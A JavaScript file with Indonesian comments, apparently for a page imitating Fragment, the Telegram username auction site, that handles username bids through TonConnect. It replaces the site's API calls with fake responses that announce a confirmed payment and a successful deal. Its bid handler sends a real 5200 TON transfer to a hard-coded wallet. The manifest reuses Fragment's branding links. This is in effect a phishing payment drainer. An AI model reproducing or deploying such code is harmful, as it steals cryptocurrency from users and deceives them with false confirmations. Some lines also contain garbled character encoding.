// Inisialisasi TonConnect UI
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: './tonconnect-manifest.json', // File lokal: Buat file JSON ini di root folder
    restoreConnection: true,
    buttonRootId: 'ton-connect-button' // Sesuaikan ID jika ada di HTML
});

// Override Aj.apiRequest untuk mock responses lokal (tanpa server eksternal)
const originalApiRequest = Aj ? Aj.apiRequest : null;
if (Aj) {
    Aj.apiRequest = function(method, params, callback) {
        console.log('Mock API Call:', method, params); // Debug di console

        // Mock untuk init auction/bid
        if (method === 'initUsernameAuction' || method.includes('bid') || method === 'placeBid') {
            const username = document.getElementById('page-title').textContent.split(' â€? ')[0].trim();
            const mockResponse = {
                success: true,
                html: '<div id="mock-bid-status">Mock Bid Placed! Waiting for TON confirmation...</div>',
                need_update: true,
                mode: 'bid-placed',
                qr_link: `ton://transfer/YOUR_SELLER_WALLET_ADDRESS?amount=5200000000&text=Payment for @${username}`, // Ganti YOUR_SELLER_WALLET_ADDRESS
                expire_after: 300, // 5 menit
                check_method: 'checkBidTx',
                confirmed: false
            };
            setTimeout(() => callback(mockResponse), 500); // Simulasi delay
            return;
        }

        // Mock untuk TON auth/wallet connect
        if (method === 'tonAuth' || method.includes('wallet') || method === 'connectWallet') {
            const mockResponse = {
                address: 'EQ...mock-wallet-address',
                ton_proof: 'mock-proof-string',
                logged_in: true,
                version: 2
            };
            callback(mockResponse);
            document.querySelector('.tm-header-button.ton-auth-link span').textContent = 'Wallet Connected';
            return;
        }

        // Mock untuk check tx (polling)
        if (method === 'checkBidTx') {
            setTimeout(() => {
                const confirmResponse = {
                    confirmed: true,
                    txHash: 'mock-tx-hash-123',
                    amount: 5200
                };
                callback(confirmResponse);
                const username = document.getElementById('page-title').textContent.split(' â€? ')[0].trim();
                const statusEl = document.querySelector('.tm-section-header-status');
                if (statusEl) statusEl.textContent = 'Payment Confirmed';
                const mockEl = document.getElementById('mock-bid-status');
                if (mockEl) mockEl.innerHTML = '<div style="color: green;">Payment confirmed! Username deal for @' + username + ' successful.</div>';
                alert('Pembayaran dikonfirmasi! Username @' + username + ' siap dialihkan.');
            }, 10000); // 10 detik simulasi
            return;
        }

        // Fallback: Jika tidak match, error atau original
        if (originalApiRequest) {
            originalApiRequest.call(this, method, params, callback);
        } else {
            callback({ error: 'API unavailable - using local mock mode' });
        }
    };
}

// Handler untuk tombol Place Bid
function handlePlaceBid() {
    const username = document.getElementById('page-title').textContent.split(' â€? ')[0].trim();
    const amountTon = 5200; // Dari UI
    console.log('Initiating payment for @' + username);

    // Cek koneksi wallet
    if (!tonConnectUI.connected) {
        tonConnectUI.openModal();
        return;
    }

    // Kirim transaksi via TonConnect
    tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 menit expiry
        messages: [{
            address: 'UQD4uCCSKWqbVEeksIA_a2DLGftKWYpd-IO5TQIns6ZNP0Qe', // GANTI: Wallet address penjual (EQ... format)
            amount: (amountTon * 1e9).toString(), // NanoTON (5200 TON = 5.2e12 nano)
            payload: Buffer.from(`Payment for Telegram username @${username}`).toString('base64') // Comment
        }]
    }).then((txResult) => {
        console.log('TX sent:', txResult);
        const txHash = txResult?.boc ? 'parsed-from-boc' : 'tx-id-from-result';
        document.getElementById('mock-bid-status').innerHTML = '<div>Transaction sent! Hash: ' + txHash + '. Confirming...</div>';
        startPolling(); // Mulai polling untuk konfirmasi
    }).catch((err) => {
        console.error('TX failed:', err);
        alert('Gagal mengirim transaksi. Pastikan wallet punya cukup TON.');
    });
}

// Event listener untuk tombol confirm di popup
document.addEventListener('DOMContentLoaded', function() {
    document.querySelector('.js-do-bid-btn')?.addEventListener('click', handlePlaceBid);
});

// Polling untuk update status
let pollingInterval;
function startPolling() {
    pollingInterval = setInterval(() => {
        if (Aj && Aj.apiRequest) {
            Aj.apiRequest('checkBidTx', {}, (res) => {
                if (res.confirmed) {
                    clearInterval(pollingInterval);
                    const username = document.getElementById('page-title').textContent.split(' â€? ')[0].trim();
                    document.querySelector('.tm-status-avail').textContent = 'Deal Confirmed';
                }
            });
        }
    }, 5000);
}

// Trigger polling setelah bid
window.addEventListener('ton_connect_transaction_sent', startPolling);

// File tonconnect-manifest.json (buat di root folder):
/*
{
  "url": "http://localhost:3000",
  "name": "Telegram Username Payment Confirm",
  "iconUrl": "https://fragment.com/img/fragment_icon.svg",
  "termsOfUseUrl": "https://fragment.com/terms",
  "privacyPolicyUrl": "https://fragment.com/privacy"
}
*/
```